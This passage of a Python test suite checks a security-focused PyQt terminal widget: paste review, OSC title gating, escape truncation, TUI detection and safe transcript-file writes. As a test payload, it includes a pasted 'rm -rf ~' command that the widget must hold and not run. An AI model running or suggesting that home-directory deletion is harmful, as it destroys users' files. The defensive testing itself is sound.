       'cli_terminfo_dir: compiles the terminfo via tic on demand')
    # when the cache directory cannot even be created (its parent is a file), the
    # compile step raises and it falls back to None
    _ti3 = tempfile.mkdtemp()
    _src3 = os.path.join(_ti3, 'secure-terminal.ti')
    with open(_src3, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    _blk = os.path.join(_ti3, 'blocker')
    with open(_blk, 'w', encoding='utf-8') as _f:
        _f.write('x')
    os.environ['XDG_CACHE_HOME'] = os.path.join(_blk, 'sub')   # parent is a file
    _term._terminfo_source = lambda: _src3
    ok(_term.cli_terminfo_dir() is None,
       'cli_terminfo_dir: an un-creatable cache dir falls back to None')
finally:
    _term._terminfo_source = _o_ts
    if _o_cache is None:
        os.environ.pop('XDG_CACHE_HOME', None)
    else:
        os.environ['XDG_CACHE_HOME'] = _o_cache

# _sync_display: re-entering grid mode with a cleared screen rebuilds it
_sd = SecureTerminal(command='/bin/cat')
_sd.apply_tui(True)
_sd._grid_shown = True
_sd._screen = None
_sd._sync_display()
ok(_sd._screen is not None, '_sync_display rebuilds a cleared pyte screen')
_sd._render_timer.stop()
_sd._sync_timer.stop()

# _delete_grid with scrollback above the live grid also eats the joining newline
_dg = SecureTerminal(command='/bin/cat')
_dg._append('l1\nl2\nl3\nl4\nl5')
_dg._grid_rows = 2
_dg._delete_grid()
ok(True, '_delete_grid removes the live grid and the newline joining it')

# _fmt_from_key: a marking carrying no colour yields a plain format
_ff = SecureTerminal(command='/bin/cat')
ok(_ff._fmt_from_key((_MK, (), 0x41)) is not None,
   '_fmt_from_key: a colourless marking -> a plain format')

# --- font: secure default + fixed-pitch fallback chain + per-tab set ----------
from secure_terminal.terminal import DEFAULT_FONT_FAMILY as _DFF   # noqa: E402
from PyQt6.QtGui import QFont as _QFont                            # noqa: E402
eq(_DFF, 'Hack', 'default font family is Hack (confusable-disambiguating, no ligatures)')
_fnt = SecureTerminal(command='/bin/cat')
eq(_fnt.current_font_family(), 'Hack', 'a new terminal starts on the default font family')
eq(_fnt.font().family(), 'Hack',
   'the terminal uses the chosen family (Hack is a hard dependency; no fallback list)')
ok(_fnt.font().styleHint() == _QFont.StyleHint.Monospace and _fnt.font().fixedPitch(),
   'the terminal font is fixed-pitch monospace (steers Qt substitution; no proportional pick)')
_fnt.set_font_family('JetBrains Mono')
eq(_fnt.current_font_family(), 'JetBrains Mono', 'set_font_family switches the tab font')
ok(_fnt.font().families()[:1] == ['JetBrains Mono'], 'the new family is applied to the widget')
_fnt.set_font_family('   ')
eq(_fnt.current_font_family(), 'Hack', 'an empty/whitespace family falls back to the default')
_fnt.set_font_family('IBM Plex Mono')
_fnt.apply_zoom(150)
eq(_fnt.current_font_family(), 'IBM Plex Mono', 'a zoom change preserves the chosen family')
# base font size: settable, clamped to a readable range, and scaled by the zoom.
_fnt.apply_zoom(100)
_fnt.set_font_size(16)
eq(_fnt.current_font_size(), 16, 'set_font_size sets the base point size')
eq(_fnt.font().pointSize(), 16, 'the base size reaches the widget font at 100% zoom')
_fnt.set_font_size(100000)
eq(_fnt.current_font_size(), 72, 'an oversized font size is clamped to the max')
_fnt.set_font_size(0)
eq(_fnt.current_font_size(), 6, 'a tiny font size is clamped to the min')

# --- keyPressEvent: a preview has no child, so keys defer to the base ----------
_pvk = SecureTerminal(preview=True)
_pvsent = spy_writes(_pvk)
key(_pvk, Qt.Key.Key_A, 'a')                 # preview branch: super() handles, nothing sent
ok(not _pvsent, 'keyPressEvent: a preview terminal sends nothing to a child')

# --- keyPressEvent while a paste review is held: input is suspended ------------
_rvk = SecureTerminal(command='/bin/cat')
_rvk.apply_paste_warn('always')
_rvksent = spy_writes(_rvk)
_rvmime = QMimeData()
_rvmime.setText('held paste')
_rvk.insertFromMimeData(_rvmime)             # -> review held, input suspended
ok(_rvk.review_pending(), 'a held paste suspends input for review')
key(_rvk, Qt.Key.Key_X, 'x')                 # a stray key is swallowed, never sent
ok(not _rvksent and _rvk.review_pending(),
   'keyPressEvent: a stray key during review is swallowed, not sent')
key(_rvk, Qt.Key.Key_Return)                 # Enter rejects the held paste (safe default)
ok(not _rvk.review_pending() and not _rvksent,
   'keyPressEvent: Enter during review rejects the held paste')
_rvk.shutdown()

# --- dispatch_pending_copy is a no-op when no copy review is pending -----------
_dpc = SecureTerminal(command='/bin/cat')
_dpc.dispatch_pending_copy('stripped')       # nothing pending -> early return
ok(True, 'dispatch_pending_copy: a no-op when no review is active')
_dpc.shutdown()

# --- contextMenuEvent builds the reviewed menu and shows it --------------------
from PyQt6.QtGui import QContextMenuEvent as _QCME               # noqa: E402
from PyQt6.QtWidgets import QMenu as _QMenu2                     # noqa: E402
_cme = SecureTerminal(command='/bin/cat')
_o_menuexec = _QMenu2.exec
_QMenu2.exec = lambda *_a, **_k: None
try:
    _cev = _QCME(_QCME.Reason.Mouse, _QPoint(5, 5), _cme.mapToGlobal(_QPoint(5, 5)))
    _cme.contextMenuEvent(_cev)
    ok(True, 'contextMenuEvent shows the reviewed context menu')
finally:
    _QMenu2.exec = _o_menuexec
_cme.shutdown()

# --- _reviewed_context_menu tolerates an already-disconnected copy action ------
from PyQt6.QtGui import QAction as _QAction2                     # noqa: E402
_rcm = SecureTerminal(command='/bin/cat')
_o_std = _rcm.createStandardContextMenu


def _fake_std(_pos=None):
    _fm = _QMenu2(_rcm)
    _fa = _QAction2('Copy', _fm)
    _fa.setObjectName('edit-copy')
    _fm.addAction(_fa)
    # drain the menu's own triggered connection so the reroute's disconnect()
    # finds nothing to disconnect -> the defensive TypeError path fires.
    try:
        _fa.triggered.disconnect()
    except TypeError:
        ## Nothing was connected, which is exactly the state this fixture wants:
        ## the reroute's own disconnect() then hits its defensive TypeError path.
        pass
    return _fm


_rcm.createStandardContextMenu = _fake_std
try:
    _m2 = _rcm._reviewed_context_menu(_QPoint(5, 5))
    ok(any(a.objectName() == 'edit-copy' for a in _m2.actions()),
       '_reviewed_context_menu tolerates an undisconnectable copy action')
finally:
    _rcm.createStandardContextMenu = _o_std
_rcm.shutdown()

# --- shutdown tolerates an already-disconnected readable notifier --------------
_sdn = SecureTerminal(command='/bin/cat')
if _sdn._notifier is not None:
    _sdn._notifier.activated.disconnect()    # pre-disconnect: shutdown's disconnect raises
_sdn.shutdown()                              # -> except (TypeError, RuntimeError): pass
ok(True, 'shutdown tolerates an already-disconnected readable notifier')

# --- _cp_at falls back to an untagged readable glyph's own codepoint -----------
# In show mode the render tags every non-ASCII cell with its source codepoint;
# a glyph inserted straight into the document (no tag) exercises the char-itself
# fallback in _cp_in_box.
_cpf = SecureTerminal(command='/bin/cat')
_cpf.apply_mode('show')
_cpfcur = _cpf.textCursor()
_cpfcur.insertText(chr(0x00E9) * 3)          # 'e-acute', inserted untagged (no _CP_PROP)
_cpf.resize(600, 200)
_cpf.show()
pump(30)
_cpfpc = QTextCursor(_cpf.document())
_cpfpc.setPosition(1)
eq(_cpf._cp_at(_cpf.cursorRect(_cpfpc).center()), 0x00E9,
   '_cp_at falls back to an untagged readable glyph own codepoint')
_cpf.shutdown()

# --- REGRESSION: an OSC title must never LATCH past the gate or a mode switch --
# pyte keeps the last title it ever parsed in screen.title, so reading that field
# adopts a title the tab was not showing titles for: one set while osc_title was
# off is picked up by the next unrelated OSC once the user enables it, and
# re-seeding the grid on a CLI->TUI switch replays every historical title out of
# the retained scrollback. The title must come from the bytes arriving NOW.
if tui_available():
    _lt = SecureTerminal(command='/bin/cat', tui=True)
    _lt_titles = []
    _lt.title_changed.connect(_lt_titles.append)
    feed_output(_lt, b'\x1b]2;EVIL\x07')            # osc_title off by default
    eq(_lt_titles, [], 'a title arriving while osc_title is off emits nothing')
    _lt.apply_osc('osc_title', True)
    feed_output(_lt, b'ordinary output\r\n')
    eq(_lt_titles, [],
       'opening the title gate does not adopt the title latched while it was shut')
    feed_output(_lt, b'\x1b]7;file:///tmp\x07')     # an unrelated OSC
    eq(_lt_titles, [],
       'an unrelated OSC does not flush the title latched while the gate was shut')
    feed_output(_lt, b'\x1b]2;GOOD\x07')
    eq(_lt_titles, ['GOOD'], 'a title arriving while the gate is OPEN is adopted')
    _lt.shutdown()

    # ...and the same title replayed out of the CLI scrollback when the grid is
    # seeded on a mode switch is not adopted either.
    _ls = SecureTerminal(command='/bin/cat')          # starts in CLI mode
    _ls.apply_osc('osc_title', True)
    _ls_titles = []
    _ls.title_changed.connect(_ls_titles.append)
    feed_output(_ls, b'\x1b]2;STALE\x07hello\r\n')
    eq(_ls_titles, [], 'CLI mode adopts no program title at all')
    ok(_ls.apply_tui(True), 'the tab switches to TUI mode')
    feed_output(_ls, b'more output\r\n')
    eq(_ls_titles, [],
       'seeding the TUI grid does not adopt a title replayed from the scrollback')
    _ls.shutdown()

# --- REGRESSION: capping the retained raw output must not cut mid-escape -------
# _raw is bounded by keeping its tail; a plain slice can land inside a sequence
# and the introducer-less remainder then renders as literal text on the next mode
# re-render (and mis-parses when the grid is seeded).
_cr = SecureTerminal(command='/bin/cat')
_cr._RAW_MAX = 11              # so the cap lands INSIDE the SGR below
_cr._RERENDER_TAIL = 11
feed_output(_cr, b'A' * 30 + b'\x1b[31mHELLO\r\n')
_cr.apply_mode('show')                       # re-renders from the capped tail
_cr_text = _cr.toPlainText()
ok('31m' not in _cr_text and '[31' not in _cr_text,
   'a capped raw buffer re-renders with no half-escape leaking as literal text')
ok('HELLO' in _cr_text, 'the surviving tail of the capped buffer still renders')
_cr.shutdown()

# --- REGRESSION: the caret offset is in DOCUMENT units, not code points --------
# A Qt document position counts UTF-16 units, so an astral glyph (Show mode passes
# emoji through) is ONE Python character but TWO positions; counting code points
# left the caret one place short for every astral character before it.
_ac2 = SecureTerminal(command='/bin/cat')
_ac2.apply_mode('show')
feed_output(_ac2, 'A\U0001f600B'.encode('utf-8'))
eq(_ac2.textCursor().position(), _ac2.document().characterCount() - 1,
   'the caret lands at the true end of the line after an astral glyph')
_ac2.shutdown()

# --- REGRESSION: full-screen detection survives line_edits=false ---------------
# With line editing off the child runs under `secure-terminal-noedit`, which
# cancels el/el1 on top of the base entry's cup/cuu/smcup -- so a curses program
# emits no alternate screen, no cursor motion and no EL burst, and EVERY
# escape-based detector is structurally dead. The terminfo-independent fallback is
# the pty's own line discipline: raw mode plus a foreground program means that
# program is drawing its own screen.
_rawdir = tempfile.mkdtemp(prefix='st-noedit-')
_rawsh = os.path.join(_rawdir, 'raw.sh')
with open(_rawsh, 'w') as _rf:
    _rf.write('#!/bin/sh\nstty raw -echo\nprintf DRAWING\nsleep 20\n')
os.chmod(_rawsh, 0o700)
_plainsh = os.path.join(_rawdir, 'plain.sh')
with open(_plainsh, 'w') as _pf:
    _pf.write('#!/bin/sh\nprintf "PLAIN\\n"\nsleep 20\n')
os.chmod(_plainsh, 0o700)

_rw = SecureTerminal(command=_rawsh, line_edits=False)
_rw_adv = []
_rw.advise_signal.connect(_rw_adv.append)
_rw.resize(700, 300)
_rw.show()
pump(900)
ok(_rw._child_raw_mode(), 'the pty line discipline reports the child raw mode')
ok(_rw._tui_hint_shown and any('TUI' in a for a in _rw_adv),
   'line_edits off: a keyboard-owning program still raises the TUI advisory')
_rw.shutdown()

_rw2 = SecureTerminal(command=_plainsh, line_edits=False)
_rw2_adv = []
_rw2.advise_signal.connect(_rw2_adv.append)
_rw2.resize(700, 300)
_rw2.show()
pump(900)
ok(not _rw2._child_raw_mode(), 'ordinary line output leaves the pty cooked')
ok(not _rw2._tui_hint_shown,
   'ordinary line output under line_edits off raises no advisory')
_rw2.shutdown()

_rw3 = SecureTerminal(command=_rawsh)             # line editing ON
_rw3_adv = []
_rw3.advise_signal.connect(_rw3_adv.append)
_rw3.resize(700, 300)
_rw3.show()
pump(900)
ok(not _rw3._tui_hint_shown,
   'the raw-mode fallback is confined to the line_edits-off setting')
_rw3.shutdown()

# ==============================================================================
# ai-review reconcile regression tests (each canary-verified: FAILS on pre-fix code)
# ==============================================================================
import secure_terminal.terminal as _TERM_rc                # noqa: E402


def _feed_defer(term, raw):
    """Feed `raw` through the live streaming path (defer=True) WITHOUT flushing the
    paint, so a debounced paint is left pending exactly as it is mid-16ms-window in
    the running app -- unlike feed_output, which flushes."""
    r, w = os.pipe()
    old = term._fd                             # pylint: disable=protected-access
    term._fd = r
    try:
        os.write(w, raw)
        os.close(w)
        w = None
        term._on_readable()                    # pylint: disable=protected-access
    finally:
        term._fd = old
        os.close(r)
        if w is not None:
            os.close(w)


# --- reconcile #1: a MULTILINE paste in a TUI WITHOUT bracketed paste is HELD ---
# The forced review is exempted for a multiline paste ONLY when the child enabled
# bracketed paste (DEC 2004): only then is the payload buffered as inert data and
# cannot auto-run. A TUI that has NOT enabled it is no safer than line mode -- an
# embedded \r auto-executes -- so it must be held. paste_warn='never' isolates the
# forced-review gate from the ordinary risky-content gate. (Pre-fix: force_review
# = multiline and not tui_active(), so a non-bracketed TUI wrongly auto-ran it.)
_bp_no = SecureTerminal(command='/bin/cat', tui=True)
_bp_no.apply_paste_warn('never')
ok(_TERM_rc._BRACKETED_PASTE_MODE not in getattr(_bp_no._screen, 'mode', ()),
   'reconcile#1: the TUI child has NOT enabled bracketed paste')
_bp_sent = spy_writes(_bp_no)
_pm_bp = QMimeData()
_pm_bp.setText('echo one\nrm -rf ~\n')                     # embedded newline
_bp_no.insertFromMimeData(_pm_bp)
ok(_bp_no.review_pending() and _bp_sent == [],
   'reconcile#1: a multiline paste in a NON-bracketed TUI is held (nothing auto-runs)')
_bp_no.dispatch_pending_paste('reject')

# with bracketed paste ACTIVE the child buffers the payload, so the same multiline
# paste is exempt from the forced hold and delivered framed between 200~/201~.
_bp_yes = SecureTerminal(command='/bin/cat', tui=True)
_bp_yes.apply_paste_warn('never')
feed_output(_bp_yes, b'\x1b[?2004h')                       # enable DEC 2004
ok(_TERM_rc._BRACKETED_PASTE_MODE in getattr(_bp_yes._screen, 'mode', ()),
   'reconcile#1: bracketed paste is now enabled on the TUI child')
_bp_sent2 = spy_writes(_bp_yes)
_pm_bp2 = QMimeData()
_pm_bp2.setText('echo one\nrm -rf ~\n')
_bp_yes.insertFromMimeData(_pm_bp2)
ok(not _bp_yes.review_pending(), 'reconcile#1: a bracketed multiline paste is not held')
_bp_frame = b''.join(_bp_sent2)
ok(_bp_frame.startswith(b'\x1b[200~') and _bp_frame.endswith(b'\x1b[201~'),
   'reconcile#1: a bracketed paste is delivered framed as inert data')

# --- reconcile #3: expanded Unicode stays reachable by WRAPPING, never hidden -----
# A line of many non-ASCII cells renders each as a long Detail badge, far wider than
# the viewport. A real terminal has no horizontal scroll: the display WRAPS to the
# width (WidgetWidth) so every badge stays on screen -- nothing pushed off the right
# edge, and no auto-scroll that would clip the START of each row. In CLI the horizontal
# scrollbar policy stays as-needed only for the residual Box/Show wide-glyph overflow
# (left NoWrap for cross-mode stability, and home-pinned by _paint_line); a grid/TUI tab
# suppresses it entirely (AlwaysOff -- see the scrollbar-policy block near the top). It
# must NOT appear for a wrapped Detail line either way.
_hs = SecureTerminal(command='/bin/cat')                   # default Detail mode (CLI)
_hs.resize(220, 120)
_hs.show()
APP.processEvents()
ok(_hs.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
   'reconcile#3: CLI keeps the horizontal scrollbar policy as-needed')
feed_output(_hs, ('\u00e9' * 40).encode('utf-8'))     # 40 long badges -> wide line
APP.processEvents()
eq(_hs.lineWrapMode(), _QPTE.LineWrapMode.WidgetWidth,
   'reconcile#3: Detail wraps the display to the width')
# The line is ~40 badges * ~40 chars, far wider than a 220px viewport: under NoWrap
# it would overflow (max > 0, as the home-pin canary above proves for Show mode), so
# max == 0 here IS the proof it wrapped to the width instead of scrolling.
ok(_hs.horizontalScrollBar().maximum() == 0,
   'reconcile#3: the wrapped Detail line needs NO horizontal scroll (nothing hidden off-screen)')
_hs.close()

# --- reconcile #4: a mid-debounce mode change drops the stale pending paint ------
# If a mode/color/marking change calls _rerender() during the 16ms paint debounce,
# the pending completed lines must be cleared FIRST -- else _rerender replays the
# raw tail AND the stale pending flushes too, duplicating output.
_dp = SecureTerminal(command='/bin/cat')
_feed_defer(_dp, b'dupline\ntail')                         # one completed line + tail
ok(_dp._paint_dirty, 'reconcile#4: a paint is pending mid-debounce (not yet flushed)')
_dp.apply_markings(not _dp.markings_enabled())             # a live toggle -> _rerender
eq(_dp.transcript_text().count('dupline'), 1,
   'reconcile#4: a mid-debounce rerender does not duplicate the pending line')

# --- reconcile #5: a theme switch recolours existing CLI markings ----------------
# MARKING_COLORS is theme-keyed. apply_theme() clears the caches, but formats
# already in the CLI document keep the old palette until repainted. A theme switch
# must rebuild the CLI document so existing markings take the new theme's colours.
_th = SecureTerminal(command='/bin/cat')
_th.apply_theme('light')
feed_output(_th, b'\xc3\xa9')                              # e-acute -> a nonascii marking
eq(_fmt_of_char(_th, '<').foreground().color().name(), mark_fg(_th, 'nonascii'),
   'reconcile#5: the existing marking uses the light-theme colour before the switch')
_th.apply_theme('dark')
eq(_fmt_of_char(_th, '<').foreground().color().name(), mark_fg(_th, 'nonascii'),
   'reconcile#5: after the switch the existing marking uses the DARK theme colour')

# --- reconcile #6: Show mode keeps a REAL U+2423, collapses the synthetic marker --
# A U+2423 OPEN BOX the child actually printed (source cp IS 0x2423) is kept as its
# glyph on copy; the SYNTHETIC SPACE_MARK for a neutralized non-ASCII space is the
# same glyph but its source cp is the space byte, so it collapses to '_'. The copy
# path tells them apart via the recorded codepoint (a blind string map clobbered
# the real glyph -- the regression).
_rb = SecureTerminal(command='/bin/cat')
_rb.apply_mode('show')
feed_output(_rb, b'\xe2\x90\xa3')                          # a literal U+2423 OPEN BOX
_rb.selectAll()
ok('\u2423' in _rb._selection_text(),
   'reconcile#6: a real printed U+2423 in Show mode is kept as its glyph on copy')
_sm = SecureTerminal(command='/bin/cat')
_sm.apply_mode('show')
feed_output(_sm, b'\xc2\xa0')                              # NBSP -> synthetic SPACE_MARK
_sm.selectAll()
_sm_copy = _sm._selection_text()
ok('_' in _sm_copy and '\u2423' not in _sm_copy,
   'reconcile#6: the synthetic non-ASCII-space marker still copies as _ (never a space)')

# --- SECURE_TERMINAL_SHOT: deterministic screenshot mode (#51) ----------------
# A startup capture MODE (env, not a persisted per-tab setting): the caret is
# hidden and the document renders SYNCHRONOUSLY, so a capture of unchanged content
# is byte-identical run to run (the comparison shots jitter otherwise -- an async
# paint race lands the prompt +/-1 row, plus the blinking caret). Every branch is
# gated on the flag; with it OFF the render path is unchanged (a matched control
# widget asserts that below).
import hashlib as _st_hl


def _grab_sha(w):
    """sha256 of the widget's rendered pixels -- the 'byte-identical output' the
    shot mode must guarantee for the same content across two independent renders."""
    img = w.grab().toImage()
    ptr = img.constBits()
    ptr.setsize(img.sizeInBytes())
    return _st_hl.sha256(bytes(ptr)).hexdigest()


# Control (shot mode OFF, built with the env unset): the CLI paint DEFERS to the
# 16ms debounce timer and the caret keeps its normal width -- normal behaviour.
_ns = SecureTerminal(command='/bin/cat')
ok(_ns._shot is False, 'shot off: the flag is False when SECURE_TERMINAL_SHOT is unset')
ok(_ns.cursorWidth() != 0, 'shot off: the caret keeps its normal (non-zero) width')
_ns._feed_line('deferred-line\n', defer=True)
ok(_ns._paint_dirty is True, 'shot off: a deferred CLI paint stays pending (not flushed)')
ok(_ns._paint_timer.isActive(), 'shot off: the CLI paint is debounced on the timer')
# Control (shot OFF) TUI: the grid repaint defers to _render_timer, so the fed row
# is NOT in the document yet (no event loop ran the single-shot timer).
_nst = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_nst, b'grid-off\r\n')
ok(_nst._render_timer.isActive(), 'shot off: the TUI grid repaint is debounced on the timer')

os.environ['SECURE_TERMINAL_SHOT'] = '1'
try:
    # __init__: the flag is read and the caret is hidden (cursorWidth 0 -> no frame
    # depends on the blink phase).
    _s1 = SecureTerminal(command='/bin/cat')
    ok(_s1._shot is True, 'shot on: SECURE_TERMINAL_SHOT=1 sets the flag')
    eq(_s1.cursorWidth(), 0, 'shot on: the caret is hidden (cursorWidth 0)')
    # _feed_line: a deferred CLI paint is forced synchronous -> painted NOW, no timer.
    _s1._feed_line('sync-line\n', defer=True)
    ok(_s1._paint_dirty is False, 'shot on: the CLI paint flushed synchronously (nothing pending)')
    ok(not _s1._paint_timer.isActive(), 'shot on: no CLI debounce timer is armed')
    ok('sync-line' in _s1.toPlainText(), 'shot on: the fed line is in the document immediately')
    # TUI read path: the grid repaint renders synchronously (no _render_timer), so the
    # fed row is already in the document with no event loop.
    _st = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_st, b'grid-on\r\n')
    ok(not _st._render_timer.isActive(), 'shot on: the TUI grid rendered synchronously, no debounce timer')
    ok('grid-on' in _st.toPlainText(), 'shot on: the fed grid row is in the document immediately')

    # Determinism proof: two INDEPENDENT shot-mode widgets fed identical content render
    # byte-identical pixels; different content renders different pixels (so the hash is
    # not trivially constant). This is the jitter the mode removes.
    _d1 = SecureTerminal(command='/bin/cat'); _d1.resize(600, 400)
    _d2 = SecureTerminal(command='/bin/cat'); _d2.resize(600, 400)
    _payload = b'user@host:~$ echo hello\r\nhello\r\nuser@host:~$ \r\n'
    feed_output(_d1, _payload)
    feed_output(_d2, _payload)
    _h1, _h2 = _grab_sha(_d1), _grab_sha(_d2)
    ok(_h1 == _h2, 'shot on: identical content renders byte-identical pixels (sha256 match)')
    _d3 = SecureTerminal(command='/bin/cat'); _d3.resize(600, 400)
    feed_output(_d3, b'user@host:~$ echo DIFFERENT\r\nDIFFERENT\r\n')
    ok(_grab_sha(_d3) != _h1, 'shot on: different content renders different pixels (hash reflects content)')
    for _sw in (_s1, _st, _d1, _d2, _d3):
        _sw.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_SHOT']
for _sw in (_ns, _nst):
    _sw.shutdown()

# --- SECURE_TERMINAL_TRANSCRIPT_FILE: live transcript file (mode-agnostic) -----
# A generic configuration (NOT shot-mode-gated): when the env names a path, each read
# (re)writes this tab's transcript_text() there, atomically. A capture harness reads it
# to VERIFY a shot actually rendered its payload -- a screenshot cannot tell an empty
# terminal from a full one, the window chrome paints either way.
_tp = os.path.join(tempfile.mkdtemp(prefix='st-tr-'), 'transcript.txt')
os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE'] = _tp
try:
    # Mode-agnostic: the env is honoured even with shot mode OFF (the path is not gated on
    # shot mode). The write is debounced to the trailing edge of an output burst, so pump
    # the loop past the ~30ms timer before reading -- this is also AFTER the render, so the
    # file reflects the painted frame (CLI and TUI alike).
    _td = SecureTerminal(command='/bin/cat')          # NB: shot mode is OFF here
    eq(_td._transcript_file, _tp,
       'transcript file: the path is read from the env (mode-agnostic, no shot mode needed)')
    feed_output(_td, b'user@host:~$ cat demo\r\nMARKER-CLI\r\n')
    pump(80)
    ok(os.path.exists(_tp), 'transcript file: written once output settles')
    with open(_tp, encoding='utf-8') as _fh:
        _written = _fh.read()
    ok('MARKER-CLI' in _written, 'transcript file: carries the CLI rendered output')
    _td.shutdown()
    # TUI / alt screen: transcript_text() walks the rendered document, so the alt-screen
    # frame lands in the file too -- exactly the surface a capture uses to reject an empty
    # grab. The debounce fires after the deferred TUI render, so no pre-render lag.
    _tdt = SecureTerminal(command='/bin/cat', tui=True)
    _tdt.resize(600, 300)
    _tdt.show()
    pump(40)
    feed_output(_tdt, b'\x1b[?1049h\x1b[2J\x1b[HMARKER-TUI')
    pump(80)
    with open(_tp, encoding='utf-8') as _fh:
        _written_tui = _fh.read()
    ok('MARKER-TUI' in _written_tui,
       'transcript file: carries the TUI (alt-screen) rendered frame')
    _tdt.shutdown()
    # Race guarantee: the write forces a PENDING grid render before serialising, so the
    # file reflects the latest frame even if the transcript debounce fires before the
    # render debounce (possible under load). Write IMMEDIATELY (render still pending, no
    # pump) and the flush makes the frame land anyway.
    _tdr = SecureTerminal(command='/bin/cat', tui=True)
    _tdr.resize(600, 300)
    _tdr.show()
    pump(40)
    feed_output(_tdr, b'\x1b[?1049h\x1b[2J\x1b[HMARKER-RACE')
    ok(_tdr._render_timer.isActive(),
       'transcript file: a TUI grid render is pending right after the read')
    _tdr._write_transcript_file()          # must flush that pending render first
    with open(_tp, encoding='utf-8') as _fh:
        _raced = _fh.read()
    ok('MARKER-RACE' in _raced,
       'transcript file: the write forces a pending render (no pre-render lag under load)')
    _tdr.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE']
# Opt-in only: no env -> no path, no writes (a normal session never spills to disk).
_tn = SecureTerminal(command='/bin/cat')
ok(_tn._transcript_file is None,
   'transcript file: no path unless SECURE_TERMINAL_TRANSCRIPT_FILE is set')
_tn.shutdown()

# transcript file: a co-resident attacker who pre-plants a file at the (old, guessable)
# <path>.tmp must not capture the secret transcript. The write now uses an unguessable
# mkstemp name created O_EXCL + 0o600, so the pre-planted file is never reused and the
# result is always owner-only -- the fixed-name O_TRUNC path would have RENAMED the
# planted inode into place, keeping the attacker's mode.
_secdir = tempfile.mkdtemp(prefix='st-trsec-')
_secpath = os.path.join(_secdir, 'transcript.txt')
_planted = _secpath + '.tmp'
with open(_planted, 'w', encoding='utf-8'):
    pass
_plant_ino = os.stat(_planted).st_ino                   # the attacker's pre-planted <path>.tmp
os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE'] = _secpath
try:
    _tsec = SecureTerminal(command='/bin/cat')
    feed_output(_tsec, b'SECRET-XYZ\r\n')
    pump(80)
    _mode = os.stat(_secpath).st_mode & 0o777
    with open(_secpath, encoding='utf-8') as _sfh:
        _secwritten = _sfh.read()
    # The fixed-name O_TRUNC path REUSES the plant (its inode becomes the transcript,
    # keeping the attacker's mode); mkstemp writes a FRESH 0o600 inode and never touches
    # the plant. Assert both: a distinct inode, and owner-only mode. (Inode identity is
    # umask-independent, so it is the load-bearing canary.)
    ok(os.stat(_secpath).st_ino != _plant_ino and _mode == 0o600
       and 'SECRET-XYZ' in _secwritten,
       'transcript file: a pre-planted <path>.tmp is not reused; written owner-only 0o600 '
       '(mode 0o%o)' % _mode)
    _tsec.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE']

# --- alt-screen viewport pins to the TOP (row 0 stays visible) -----------------
# A full-screen program on the alternate screen owns a fixed canvas with no scrollback:
# its row 0 is the TOP of its screen and must stay visible. When the grid is TALLER than
# the viewport (a scroll range exists), the OLD code followed the tail and scrolled that
# row 0 off the top -- the bug that rendered the altscreen-tui comparison shot as an empty
# terminal (its payload draws a single line at row 0). Force the scroll range: enter the
# alt screen, grow the pyte grid past the viewport, put content at row 0, and assert the
# view is pinned to the TOP (row 0 visible, scrollbar at its minimum), not the tail. FAILS
# on the pre-fix follow-tail behaviour, so it is a real regression trip.
_avs = SecureTerminal(command='/bin/cat', tui=True)
_avs.resize(600, 300)                       # ~18-row viewport
_avs.show()
pump(60)
feed_output(_avs, b'\x1b[?1049h')           # enter the alternate screen
_avs._screen.resize(60, _avs._screen.columns)   # grid far taller than the viewport
feed_output(_avs, b'\x1b[2J\x1b[HTOP-ROW-CONTENT')   # content at row 0 of the tall grid
pump(60)
ok(_avs._alt_screen, 'alt-screen top-pin: on the alternate screen after the enter marker')
_avs_bar = _avs.verticalScrollBar()
ok(_avs_bar.maximum() > _avs_bar.minimum(),
   'alt-screen top-pin: the tall grid really does create a scroll range (else the test is vacuous)')
eq(_avs.firstVisibleBlock().blockNumber(), 0,
   'alt-screen top-pin: row 0 stays visible (the frame is not scrolled off the top)')
eq(_avs_bar.value(), _avs_bar.minimum(),
   'alt-screen top-pin: the view is pinned to the top, not the tail')
_avs.shutdown()

# --- Incremental TUI grid render: same document as a full rebuild, but linear --
# A full-viewport 24-bit board has a DISTINCT truecolour in every cell, so the
# same-format run coalescing never fires and each row is ~one insertText per
# column. Re-rendering the WHOLE grid on every PTY read was then quadratic (the
# ~20s show-mode gradient-board render). The incremental renderer keeps every
# unchanged block, promotes scrolled-off rows to permanent scrollback, and
# re-renders only the changed rows -- so a row is drawn about once (linear) while
# producing a byte-identical document. The signature IS the rendered runs, so any
# theme / mode / marking / colour change forces a correct re-render (never stale).


def _distinct_board(cols, rows):
    """Bytes for a rows x cols board where every cell is a distinct truecolour
    upper-half-block, so no two adjacent cells share a format (no run coalescing
    -- the renderer's worst case, and the real gradient board's shape)."""
    block = '\u2580'                       # upper half block, ASCII-escaped
    out = []
    for y in range(rows):
        line = []
        for x in range(cols):
            line.append('\x1b[38;2;%d;%d;%dm\x1b[48;2;%d;%d;%dm%s'
                        % ((x * 7) % 256, (y * 11) % 256, (x + y) % 256,
                           (y * 13) % 256, (x * 5) % 256, (x * y) % 256, block))
        out.append(''.join(line) + '\x1b[0m')
    return ('\r\n'.join(out) + '\r\n').encode()


def _fmt_key(fmt):
    return (fmt.foreground().color().name(), fmt.background().color().name(),
            int(fmt.fontWeight()), fmt.fontUnderline())


def _doc_cells(term):
    """Every rendered character with its format (fg / bg / weight / underline), so
    two documents can be compared for identical CONTENT and IDENTICAL formatting --
    an incremental render that left a cell stale diverges here. In TUI grid mode the
    formats live in the block's _GridRow (the highlighter's layout formats are not
    on the char format), so read them from there; line mode reads the fragments."""
    doc = term.document()
    cells = []
    blk = doc.begin()
    while blk.isValid():
        data = blk.userData()
        if isinstance(data, _GR):
            base = blk.position()
            for start, length, fmt, _cp in data.runs:
                seg = QTextCursor(doc)
                seg.setPosition(base + start)
                seg.setPosition(base + start + length, QTextCursor.MoveMode.KeepAnchor)
                for ch in seg.selectedText():
                    cells.append((ch, _fmt_key(fmt)))
        else:
            it = blk.begin()
            while not it.atEnd():
                frag = it.fragment()
                for ch in frag.text():
                    cells.append((ch, _fmt_key(frag.charFormat())))
                it += 1
        cells.append(('\n', None))
        blk = blk.next()
    return cells


